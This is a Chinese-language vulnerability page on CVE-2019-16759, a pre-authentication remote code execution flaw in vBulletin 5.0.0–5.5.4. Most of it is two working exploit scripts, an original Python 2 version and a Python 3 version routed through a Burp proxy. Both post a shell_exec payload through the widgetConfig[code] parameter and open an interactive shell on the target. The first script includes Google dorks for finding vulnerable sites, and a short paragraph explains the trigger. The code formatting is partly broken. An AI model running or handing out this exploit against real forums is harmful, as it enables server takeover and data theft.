---
title: （CVE-2019-16759）vBulletin 5.x 0day pre-auth RCE exploit
id: zhfly3218
---

# （CVE-2019-16759）vBulletin 5.x 0day pre-auth RCE exploit

## 一、漏洞简介

## 二、漏洞影响

影响版本：vBulletin 5.0.0~5.5.4

## 三、复现过程

```
poc如下:

#!/usr/bin/python

# vBulletin 5.x 0day pre-auth RCE exploit

# This should work on all versions from 5.0.0 till 5.5.4

# Google Dorks:

# - site:*.vbulletin.net

# - “Powered by vBulletin Version 5.5.4”

import requests

import sys

if len(sys.argv) != 2:

sys.exit(“Usage: %s <URL to vBulletin>” % sys.argv[0])

params = {“routestring”:“ajax/render/widget_php”}

while True:

```
try:

     cmd = raw_input("vBulletin$ ")

     params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"

     r = requests.post(url = sys.argv[1], data = params)

     if r.status_code == 200:

          print r.text

     else:

          sys.exit("Exploit failed! :(")

except KeyboardInterrupt:

     sys.exit(" Closing shell...")

except Exception, e:

     sys.exit(str(e)) 
``` 
```

将poc代码修改为python3使用的代码，并添加代理使用burpsuite抓包。修改的poc代码如下：

```
# -*-coding:utf-8 -*-

import requests

import sys

if len(sys.argv) != 2:

sys.exit(“Usage: %s <URL to vBulletin>” % sys.argv[0])

proxies ={

“http”:“[http://127.0.0.1:8080/](http://127.0.0.1:8080/)”

}

params = {“routestring”:“ajax/render/widget_php”}

while True:

try:

cmd = input(">>>Shell= “)

params[“widgetConfig[code]”] = “echo shell_exec(’”+cmd+”’); exit;"

r = requests.post(url = sys.argv[1], data = params, proxies=proxies)

if r.status_code == 200:

print(r.text)

```
 else:
           sys.exit("Exploit failed! :(")
 except KeyboardInterrupt:
      sys.exit("\nClosing shell...")
 except Exception as e:
      sys.exit(str(e)) 
``` 
```

远程代码执行漏洞的触发点是未经过验证的用户通过向index.php发送routestring参数，当routesting参数是ajax/render/widget_php，通过widgetConfig[code]执行远程代码，格式为echo shell_exec('"+cmd+"'); exit;

![image](../img/63bdb93855d69e47a2b7d6b355405e43.png)